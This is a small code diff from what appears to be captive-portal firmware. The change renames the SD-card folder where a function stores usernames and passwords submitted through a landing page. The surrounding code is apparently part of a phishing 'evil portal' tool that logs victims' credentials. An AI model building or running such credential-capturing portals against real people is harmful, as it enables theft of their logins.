@@ -85,9 +85,9 @@ void handleRoot() { sendLanding(); }
 // keep the file open only long enough to append + flush.
 void appendCredToSd(const String& user, const String& pass) {
     if (!board::sdMounted()) return;
-    if (!SD.exists("/capture"))        SD.mkdir("/capture");
-    if (!SD.exists("/capture/portal")) SD.mkdir("/capture/portal");
-    File f = SD.open("/capture/portal/creds.log", FILE_APPEND);
+    if (!SD.exists("/captures"))        SD.mkdir("/captures");
+    if (!SD.exists("/captures/portal")) SD.mkdir("/captures/portal");
+    File f = SD.open("/captures/portal/creds.log", FILE_APPEND);
     if (!f) return;
     // Collapse any CR/LF in the submitted values so a crafted field can't
     // break the one-line-per-capture format.
